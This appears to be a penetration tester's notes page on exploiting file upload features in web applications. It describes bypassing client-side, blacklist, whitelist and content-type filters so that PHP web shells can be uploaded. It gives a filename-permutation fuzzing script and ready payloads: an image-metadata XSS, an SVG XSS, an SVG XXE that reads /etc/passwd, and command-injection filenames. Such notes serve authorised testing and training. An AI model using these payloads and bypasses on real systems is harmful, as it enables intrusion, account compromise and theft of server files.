File upload vulnerabilities are amongst the most common vulnerabilities found in web and mobile applications. See [[LFI and File Uploads]] as well as this page

If web page is missing validation, you can just upload a web shell, backdoor, reverse shell, and visit 
it to obtain a shell. See [[Web Shells]] and [[Methodology/Shells/Reverse Shells|Reverse Shells]]

Consider chaining with Responder to capture a hash upon a user clicking (if reverse shells fail)
## Bypassing Filters
Many web apps use methods to validate file format prior to upload. There are methods to bypass this

Before doing any of this, try selecting ALL FILE TYPES and uploading that way first...

If that fails, proceed down this series of attacks in ORDER. Type filters are usually a good bet though... 

#### Client-Side Validation
Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded (e.g., upload restricts you to uploading only .jpgs). We can bypass this by skipping front end validations altogether.

Back-end Request Modification (Method 1)
```bash
# Capture upload request with Burp
# Modify contents
filename="shell.php"
content-type= keep the same    
Data = php web shell one-liner 
```

Disabling Front-end Validation (Method 2)
```bash
# Manipulate front-end code
CTRL+SHIFT+C > Page Inspector > profile image (or wheverer upload feature is)

# Identify function that validates file type
e.g., onchange="checkFile(this)"   # CTRL+SHIFT+K to get details if you like

# Delete validator function via inspector
onchange=""
```

#### Blacklist Filters
If the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.

One type of validation is a blacklist validation, where certain file types are blocked. Weakest form of validation.

Common Extensions
	PayloadsAllTheThings [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) Extensions
	[seclists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

Fuzzing Extensions
```bash
# Capture upload request with Burp > Send to Intruder
# Modify request
Positions > Add § > filename="file§.php§"

# Load payload list
Payload configuration > Load > select extension list
Payload encoding > Uncheck "URL-encode these characters"

# Start Attack (Sniper) & Filter Results
Sort results by Length & view Response

# Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.
```

#### Whitelist Filters
A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions.

Errors will usually not say "extension is blocked" and this lets us fuzz more easily. To get around whitelists, we may need to utilize double extensions. May not work if regex pattern is strict enough.

Double Extensions
```bash
# Capture upload request with Burp > Sent to Intruder
# Modify file name
filename = "shell.jpg.php"    # Might also have to fuzz php extension
Data = <web shell>
```

Reverse Double Extension -- # Due to server misconfig
```bash
# Capture upload request with Burp > Sent to Intruder
# Modify file name
filename = "shell.php.jpg"    # Might also have to fuzz php extension
Data = <web shell>
```

Character Injection
```bash
# We might be able to trick web app to misinterpret file extension via character injection

# Inject special characters before OR after final extension
%20
%0a
%00
%0d0a
/
.\
.
…
:
e.g. shell.php%00.jpg

# For Windows / aspx, inject a : before allowed file extension
e.g. shell.aspx:.jpg

# Example bash script to generate all permutations of a file name
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
# Then run fuzzing scan with Burp Intruder
```

#### Type Filter
Web apps also often test content of uploaded files to ensure it matches specified type. Two common methods -- `Content-Type Header` or `File Content`

You might as well just alter BOTH the content and MIME type...

Content-Type -- see [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) for fuzzing if needed.
```bash
# Intercept Burp upload request and modify
filename=shell.php
Content-Type: image/jpg   # might need to google for special types
Data: <shell>
```

MIME-TYPE -- see [[Magic Numbers Cheatsheet]]
```bash
# Intercept Burp upload request and modify
filename=shell.php
Content-Type: image/jpg   # might need to google for special types
Data: 

<Magic Bytes>
<shell>
```


## Other Upload Attacks
Certain file types, like `SVG`, `HTML`, `XML`, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files.

#### XSS
Many file types may allow us to introduce a `Stored XSS` vulnerability to the web application by uploading maliciously crafted versions of them. Most basic example is uploading `HTML` files, but here are some other examples:

Metadata Paramaters in file upload
```bash
# Embed XSS in comment of image
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg

# Upload
```

SVG file to include an XSS payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

#### XXE
XML External Entity
If we can upload SVG files, we can potentially use an XXE attack

SVG file to leak content of /etc/passwd
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```


#### Injections in File Name
If uploaded file name is displayed/reflected on the page, we can potentially perform a Command Injection Attack... or LFI. See [[WallpaperHub]]

Usage
```bash
# Example File Names
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```